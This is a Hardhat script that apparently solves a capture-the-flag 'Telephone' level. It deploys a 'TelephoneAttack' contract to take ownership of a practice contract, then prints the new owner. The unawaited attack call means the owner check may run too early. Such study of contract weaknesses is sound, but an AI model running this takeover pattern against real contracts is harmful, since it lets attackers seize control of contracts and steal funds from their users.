const {ethers} = require('hardhat');

const CTRT_ADDR = "0x8aCd85898458400f7Db866d53FCFF6f0D49741FF";
const PLAYER_ADDR = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"

async function main() {
  let player = await ethers.getSigner(PLAYER_ADDR);
  let contract = await ethers.getContractAt(
    "Telephone",
    CTRT_ADDR,
    player,
  );

  console.log("--[1] Deploy Attack Contract");
  const Attack = await ethers.getContractFactory("TelephoneAttack");
  const attack = await Attack.connect(player).deploy();
  await attack.deployed();
  console.log("---- Attack Contract address:", attack.address);

  attack.attack(CTRT_ADDR, PLAYER_ADDR);

  console.log(await contract.owner())
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
